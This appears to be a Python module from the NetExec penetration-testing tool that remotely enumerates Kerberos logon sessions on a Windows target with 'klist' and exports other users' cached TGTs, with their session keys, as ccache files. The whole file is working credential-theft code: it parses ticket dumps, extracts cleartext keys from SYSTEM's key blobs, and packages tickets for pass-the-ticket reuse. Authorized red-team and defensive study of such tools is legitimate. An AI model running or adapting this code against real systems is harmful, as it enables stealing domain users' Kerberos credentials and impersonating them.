import contextlib
import os
import re
import struct
from datetime import datetime, UTC

from impacket.krb5 import constants, types
from impacket.krb5.ccache import CCache, Credential, Principal, KeyBlockV4, Times, CountedOctetString, Header

from nxc.helpers.path import sanitize_path_component


class Klist:
    """Enumerate Kerberos logon sessions on a target and export their cached TGTs as ccache files."""

    # klist sessions line: "[n] <Session, localized> <ts session> 0:0x<luid> <DOMAIN\account> <package>:<logon type>"
    # e.g. "[2] Sitzung 5 0:0x16268e1b NORTH\eddard.stark Kerberos:RemoteInteractive"
    SESSION_LINE = re.compile(r"\[\d+\]\s+\S+\s+\d+\s+0:(0x[0-9a-fA-F]+)\s+(.+?)\s+(\S+:\S+)\s*$")
    MACHINE_LOGON_IDS = {"0x3e7", "0x3e4"}  # SYSTEM, NETWORK SERVICE
    KEY_SIZES = {
        constants.EncryptionTypes.des_cbc_crc.value: 8,
        constants.EncryptionTypes.des_cbc_md5.value: 8,
        constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value: 16,
        constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value: 32,
        constants.EncryptionTypes.rc4_hmac.value: 16,
        constants.EncryptionTypes.rc4_hmac_exp.value: 16,
    }

    def __init__(self, connection):
        self.connection = connection
        self.logger = connection.logger
        self.bias_minutes = 0

    def display(self):
        tgts = self.load_tgts()
        if tgts is None:
            return
        if not tgts:
            self.logger.fail("No Kerberos TGTs found")
            return
        self.logger.success(f"Found {len(tgts)} TGT(s)")
        width = max(len(account) for _, account, _ in tgts)
        for i, (logon_hex, account, info) in enumerate(tgts, 1):
            self.logger.highlight(f"  [{i}] {account:<{width}}  {logon_hex}  (expires {self.fmt_time(info['end_time'])} UTC)")

    def dump(self, selection):
        tgts = self.load_tgts()
        if tgts is None:
            return
        try:
            tgts = self.select_sessions(tgts, selection)
        except ValueError as e:
            self.logger.fail(str(e))
            return
        if not tgts:
            self.logger.fail("No valid TGTs dumped")
            return

        output_prefix = self.connection.output_file_template.format(output_folder="klist")
        os.makedirs(os.path.dirname(output_prefix), exist_ok=True)

        for logon_hex, account, info in tgts:
            self.write_ccache(info, self.ccache_path(output_prefix, info, logon_hex))
            self.logger.highlight(f"{account}  (expires {self.fmt_time(info['end_time'])} UTC)")
        self.logger.success(f"Dumped {len(tgts)} TGT(s) to {os.path.dirname(output_prefix)}")

    def load_tgts(self):
        """Returns None when klist itself could not run, a (possibly empty) list otherwise."""
        output = self.connection.execute("klist sessions", True)
        if not output:
            self.logger.fail("Failed to enumerate Kerberos sessions")
            return None
        self.bias_minutes = self.target_utc_bias()
        return self.collect_tgts(self.parse_sessions(output))

    def parse_sessions(self, text):
        """Keep only sessions that can hold a usable TGT: Kerberos logons other than
        network ones (interactive, service, batch...) and the machine account's own
        sessions (SYSTEM, NETWORK SERVICE). DWM and other GUI pseudo-accounts are
        Negotiate:Interactive, so requiring the Kerberos prefix drops them. Network
        logons never cache a TGT, so they are the only Kerberos type dropped.
        """
        sessions = []
        seen = set()
        for line in text.splitlines():
            match = self.SESSION_LINE.search(line.strip())
            if not match:
                continue
            logon_hex, account, session_type = (group.strip() for group in match.groups())
            if not logon_hex or not account or logon_hex in seen:
                continue
            kerberos = session_type.startswith("Kerberos:") and session_type != "Kerberos:Network"
            if not (kerberos or logon_hex.lower() in self.MACHINE_LOGON_IDS):
                continue
            seen.add(logon_hex)
            sessions.append((logon_hex, account))
        return sessions

    def select_sessions(self, tgts, selection):
        if not selection:
            return tgts
        out_of_range = [i for i in selection if i < 1 or i > len(tgts)]
        if out_of_range:
            raise ValueError(f"session number(s) out of range (1-{len(tgts)}): {', '.join(str(i) for i in out_of_range)}")
        return [tgts[i - 1] for i in selection]

    def target_utc_bias(self):
        """Minutes to add to the target's local time to get UTC (UTC = local + ActiveTimeBias).
        klist prints local wallclock with no zone, so without this the ccache times and the
        expiry check are off by the target's UTC offset whenever it differs from ours.
        """
        output = self.connection.execute(r'reg query "HKLM\SYSTEM\CurrentControlSet\Control\TimeZoneInformation" /v ActiveTimeBias', True)
        match = re.search(r"ActiveTimeBias\s+REG_DWORD\s+0x([0-9a-fA-F]+)", output) if output else None
        if not match:
            self.logger.debug("Could not read ActiveTimeBias, assuming target is in UTC")
            return 0
        value = int(match.group(1), 16)
        if value >= 0x80000000:  # DWORD two's complement: east-of-UTC biases are negative
            value -= 0x100000000
        return value

    def collect_tgts(self, sessions):
        now = datetime.now(UTC).timestamp()
        tgts = []
        for logon_hex, account in sessions:
            tgt_text = self.connection.execute(f"klist tgt -li {logon_hex}", True)
            if not tgt_text:
                self.logger.debug(f"{account} ({logon_hex}): no output from klist tgt")
                continue
            info = self.parse_tgt(tgt_text)
            if not info["ticket_data"]:
                self.logger.debug(f"{account} ({logon_hex}): no TGT in cache")
                continue
            if info["cred_guard"]:
                self.logger.fail(f"{account} ({logon_hex}): Credential Guard-protected (VTL1)")
                continue
            end_time = info["end_time"]
            renew_till = info["renew_till"]
            if end_time and end_time < now:
                if not (renew_till and renew_till > now):
                    self.logger.fail(f"{account} ({logon_hex}): expired, skipping")
                    continue
                self.logger.debug(f"{account} ({logon_hex}): expired but still renewable")
            tgts.append((logon_hex, account, info))
        return tgts

    def parse_tgt(self, text):

        def field(pattern, default=""):
            match = re.search(pattern, text, re.IGNORECASE)
            return match.group(1).strip() if match else default

        def parse_time(time_str):
            if not time_str:
                return 0
            for time_format in ("%m/%d/%Y %H:%M:%S", "%m/%d/%Y %H:%M"):
                with contextlib.suppress(ValueError):
                    local = int(datetime.strptime(time_str.strip(), time_format).replace(tzinfo=UTC).timestamp())
                    return local + self.bias_minutes * 60  # local wallclock -> true UTC epoch
            return 0

        def time_field(name):
            return parse_time(field(rf"{name}\s*:\s*(\d{{1,2}}/\d{{1,2}}/\d{{4}}\s+\d{{1,2}}:\d{{2}}(?::\d{{2}})?)"))

        ticket_hex = [re.sub(r"[^0-9a-fA-F]", "", match.group(1)) for match in re.finditer(r"^[0-9a-fA-F]{4}\s+((?:[0-9a-fA-F]{2}[\s:])+)", text, re.MULTILINE)]
        ticket_bytes = bytes.fromhex("".join(ticket_hex)) if ticket_hex else b""

        key_type = int(field(r"KeyType\s+(0x[0-9a-fA-F]+)", hex(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value)), 16)

        key_hex = re.sub(r"\s+", "", field(r"KeyLength\s+\d+\s+-\s+([0-9a-fA-F][0-9a-fA-F ]*)"))
        try:
            key_blob = bytes.fromhex(key_hex) if key_hex else b""
        except ValueError:
            key_blob = b""

        cred_guard = False
        key_bytes = b""
        if key_blob:
            # SYSTEM key field is a marshalled KerberosKeyWithMetadata blob, not a raw key.
            if len(key_blob) >= 16 and struct.unpack_from("<I", key_blob, 0)[0] == len(key_blob):  # self-size@0
                type_name = b"KerberosKeyWithMetadata"
                type_name_len = struct.unpack_from("<I", key_blob, 8)[0]      # type-name length@8
                type_name_offset = struct.unpack_from("<I", key_blob, 12)[0]  # type-name offset@12
                cred_guard = (
                    type_name_len == len(type_name)
                    and 0 < type_name_offset <= len(key_blob) - len(type_name)
                    and key_blob[type_name_offset:type_name_offset + len(type_name)] == type_name
                )
                if not cred_guard:  # not Credential Guard: offset 8 is the etype, key is cleartext@28
                    blob_etype = struct.unpack_from("<I", key_blob, 8)[0]
                    key_size = self.KEY_SIZES.get(blob_etype)
                    if key_size and len(key_blob) >= 28 + key_size:
                        key_type = blob_etype
                        key_bytes = key_blob[28:28 + key_size]
            if not key_bytes and len(key_blob) == self.KEY_SIZES.get(key_type, 32):
                key_bytes = key_blob

        if not key_bytes:
            key_bytes = b"\x00" * self.KEY_SIZES.get(key_type, 32)

        return {
            "client": field(r"ClientName\s*:\s*(.+)"),
            "realm": field(r"DomainName\s*:\s*(.+)"),
            "sname": [field(r"ServiceName\s*:\s*(.+)"), field(r"TargetDomainName\s*:\s*(.+)")],
            "flags": int(field(r"Ticket Flags\s*:\s*(0x[0-9a-fA-F]+)", "0x0"), 16),
            "key_type": key_type,
            "key_data": key_bytes,
            "cred_guard": cred_guard,
            "auth_time": time_field("StartTime"),
            "start_time": time_field("StartTime"),
            "end_time": time_field("EndTime"),
            "renew_till": time_field("RenewUntil"),
            "ticket_data": ticket_bytes,
        }

    def build_principal(self, components, realm):
        source = types.Principal([components, realm], type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        principal = Principal()
        principal.fromPrincipal(source)
        return principal

    def write_ccache(self, info, path):
        ccache = CCache()

        header = Header()
        header["tag"] = 1
        header["taglen"] = 8
        header["tagdata"] = b"\xff\xff\xff\xff\x00\x00\x00\x00"
        ccache.headers = [header]

        ccache.principal = self.build_principal([info["client"]], info["realm"])

        credential = Credential()
        credential["client"] = ccache.principal
        credential["server"] = self.build_principal(info["sname"], info["realm"])
        credential["is_skey"] = 0
        credential["tktflags"] = info["flags"]
        credential["num_address"] = 0

        credential["key"] = KeyBlockV4()
        credential["key"]["keytype"] = info["key_type"]
        credential["key"]["keyvalue"] = info["key_data"]
        credential["key"]["keylen"] = len(info["key_data"])

        credential["time"] = Times()
        credential["time"]["authtime"] = info["auth_time"]
        credential["time"]["starttime"] = info["start_time"]
        credential["time"]["endtime"] = info["end_time"]
        credential["time"]["renew_till"] = info["renew_till"]

        credential.ticket = CountedOctetString()
        credential.ticket["data"] = info["ticket_data"]
        credential.ticket["length"] = len(info["ticket_data"])
        credential.secondTicket = CountedOctetString()
        credential.secondTicket["data"] = b""
        credential.secondTicket["length"] = 0

        ccache.credentials = [credential]
        ccache.saveFile(path)

    def fmt_time(self, timestamp):
        if not timestamp:
            return "N/A"
        return datetime.fromtimestamp(timestamp, tz=UTC).strftime("%Y-%m-%d %H:%M:%S")

    def ccache_path(self, prefix, info, logon_hex):
        name = sanitize_path_component(f"{info['client']}@{info['realm']}_{logon_hex}")
        return f"{prefix}_{name}.ccache"
